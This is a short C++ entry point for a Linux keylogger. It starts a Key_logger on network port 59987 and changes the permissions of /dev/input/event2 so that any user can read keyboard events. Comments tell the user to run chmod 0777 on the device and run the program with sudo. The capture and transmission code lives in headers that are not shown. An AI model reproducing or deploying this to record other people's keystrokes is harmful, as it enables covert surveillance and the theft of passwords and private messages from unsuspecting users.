#define BUF (256)
#include <iostream>
#include <stdio.h>
#include <linux/input.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <iostream>
#include <errno.h>
#include <string.h>
#include <sstream>
#include <string>
#include <ctime>
#include <vector>
#include "key_logger.h"
#include <string>
#include <map>
#include <fstream>
#include "GetProcessesList.h"
#include <X11/Xlib.h>
#include <X11/extensions/XInput2.h>
#include <assert.h>
#include "async_write.h"

constexpr int PORT = 59987;

int main()
{ 
    //1
    //cd /dev/input
    // sudo chmod 0777 event2
    //2
    //sudo ./application
    Key_logger name_of_the_keys;
    name_of_the_keys.start(PORT);
    chmod("/dev/input/event2",S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);
    return 0;
}